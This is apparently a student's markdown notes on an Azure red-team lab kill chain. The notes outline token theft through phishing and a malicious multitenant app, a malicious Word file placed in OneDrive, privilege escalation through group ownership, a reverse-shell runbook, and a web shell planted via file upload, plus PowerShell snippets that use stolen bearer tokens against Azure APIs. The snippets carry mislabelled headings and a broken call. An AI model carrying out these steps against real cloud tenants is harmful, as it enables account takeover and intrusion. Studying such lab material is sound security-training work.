 # Kill Chain 1 
 ![KillChain](/img/KC-1.png "Kill Chain 1")

  ![KillChain](/img/KC1-ThreatMatrix.png "Kill Chain TheatMatrix")

  # Kill Chain 1 

## Path 1 (9,14,
1. Register multitenant Application
2. Send Phishing Link via career.app
3. Erik's access token
4. **Enumerate All users using access token**
5. Modify API permissions and send phishing link to MarkD
6. Upload malicious word file to Mark's onedrive
7. Get MarkD's access token and find objects which is owned by MarkD 
8. Mark is owner of "Automation Admins" group
9. Add Mark to this group
10. Get an ARM token and use the one for aad-graph 
11. Check for Mark to get the role for Automation Group as "Contributor" role
12. Now Mark has contributor role on automation group this means execute Runbooks!
13.  Runbook script is PowerShellTcp.ps1 
		- import-AzAutomationRunbook
		- Publish-AzAutomationRunbook
		- Start-AzAutomationRunbook
		- 



## Path 2 (10,15
1. Abuse the insecure file upload vulneranility defcorphq 
![KillChain](/img/KC-1_1.png "Kill Chain 1")
2. After uploading the web shell, access it and pass the `env` command to check if a managed identity is assigned to the app service. Look for `IDENTITY_HEADER`, `IDENTITY_ENDPOINT`
![KillChain](/img/KC-1_2.png "Kill Chain 1")
3. Manuel API calls for know `subscription ID` for 
	- [Request an ARN token](#Request_ARN_Token)
		![KillChain](/img/KC-1_3.png "Kill Chain 1")
	- [Request an AAD Graph Token](#Request_AAD_Graph_Token)
		![KillChain](/img/KC-1_4.png "Kill Chain 1")
4. Manuel API calls for know `List all resources accessible for the managed identity assigned to the app service`
5. Manuel API calls for know `Let's see what actions are allowed`
6. 


# Request_ARN_Token
```powershell
$Token = 'eyJ0eX...'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $Token"
	}
}
(Invoke-RestMethod @RequestParams).value
```
# Request_AAD_Graph_Token
```powershell
$Token = 'eyJ0eX...'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $Token"
		}
	}
(Invoke-RestMethod).value
```

